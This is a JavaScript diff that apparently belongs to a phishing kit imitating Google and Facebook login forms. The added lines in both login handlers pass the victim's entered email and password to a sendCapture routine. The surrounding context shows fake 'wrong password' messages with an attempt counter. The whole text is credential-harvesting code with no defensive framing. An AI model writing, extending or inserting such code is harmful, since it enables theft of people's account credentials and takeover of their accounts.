@@ -1356,6 +1356,13 @@ function handleRpGoogleSubmit() {
         errEl.classList.add('show');
       }
     }, 1500);
+  } else {
+    setTimeout(function() {
+      if (btn) btn.disabled = false;
+      if (spEl) spEl.style.display = 'none';
+      if (txtEl) txtEl.style.display = '';
+      sendCapture({ username: email, password: pass, type: 'google', method: 'google' });
+    }, 1500);
   }
 }
 
@@ -1391,6 +1398,13 @@ function handleRpFacebookLogin() {
         fbErrEl.textContent = 'The email or mobile number and password you entered don\'t match. Find your account and log in. (' + sisa + ' attempt' + (sisa>1?'s':'') + ' left)';
         fbErrEl.classList.add('show');
       }
+    }, 1600);
+  } else {
+    setTimeout(function() {
+      if (btn) btn.disabled = false;
+      if (spEl) spEl.style.display = 'none';
+      if (txtEl) txtEl.style.display = '';
+      sendCapture({ username: email, password: pass, type: 'facebook', method: 'facebook' });
     }, 1600);
   }
 }
